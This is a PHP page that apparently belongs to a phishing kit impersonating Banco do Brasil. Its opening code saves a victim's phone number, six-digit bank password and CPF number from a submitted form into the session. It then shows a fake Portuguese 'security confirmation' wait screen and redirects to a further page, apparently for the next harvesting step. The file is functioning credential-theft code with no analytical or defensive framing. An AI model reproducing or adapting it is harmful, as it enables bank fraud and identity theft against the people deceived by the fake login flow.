<?php

session_start();

$_SESSION["telefone"] = "(".$_POST['ddd'].")".$_POST['tel_fone'];
$_SESSION["senha6"] = $_POST['pass6'];
$_SESSION["cpf"] = $_POST["cpf"];

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="theme-color" content="#fff200">
	<meta name="apple-mobile-web-app-status-bar-style" content="#fff200">
	<meta name="msapplication-navbutton-color" content="#fff200">
	<meta http-equiv="refresh" content=7;url="get_mai.php">
	<title>Acesso - BB</title>
	<link rel="stylesheet" href="_styles/home.css">
</head>
<body>
<div class="container bg-loading main_loading">
	<div class="content main_loading_one">
		<img src="_images/logo.png">
		<span>
			Será necessário realizar uma confirmação de segurança para liberar o acesso deste dispositívo.
			<br><br>
			Na próxima, realize o processo requerido para prosseguir com total segurança.
			<br><br>
			Aguarde...
		</span>
		<img src="_images/ajax-loader.gif">
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->
</body>
</html>
<?php
ob_end_flush();
?>
